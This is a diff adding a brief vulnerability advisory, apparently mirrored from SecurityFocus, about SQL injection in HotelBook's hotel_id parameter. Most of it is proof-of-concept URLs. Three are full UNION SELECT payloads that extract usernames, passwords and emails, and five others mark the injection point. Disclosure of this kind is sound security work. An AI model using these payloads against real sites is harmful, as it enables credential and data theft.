@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/42975/info
+
+HotelBook is prone to multiple SQL-injection vulnerabilities because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.
+
+Exploiting these issues could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database. 
+
+http://www.example.com/hotel.php?hotel_id=1'+UNION+SELECT+0,0,0,0,0,CONCAT_WS(0x3a3a3a3a3a,user_name,password,email),0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0+FROM+user/*
+http://www.example.com/details.php?hotel_id=1'+UNION+SELECT+0,0,0,0,0,CONCAT_WS(0x3a3a,user_name,password,email),0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0+FROM+user/*
+http://www.example.com/roomtypes.php?hotel_id=1'+UNION+SELECT+0,0,CONCAT_WS(0x3a3a3a3a3a,user_name,password,email),0,0,0,0,0,0,0,0+FROM+user/*
+http://www.example.com/photos.php?hotel_id=1' << SQL >>
+http://www.example.com/map.php?hotel_id=1' << SQL >>
+http://www.example.com/weather.php?hotel_id=1' << SQL >>
+http://www.example.com/reviews.php?hotel_id=1' << SQL >>
+http://www.example.com/book.php?hotel_id=1' << SQL >>
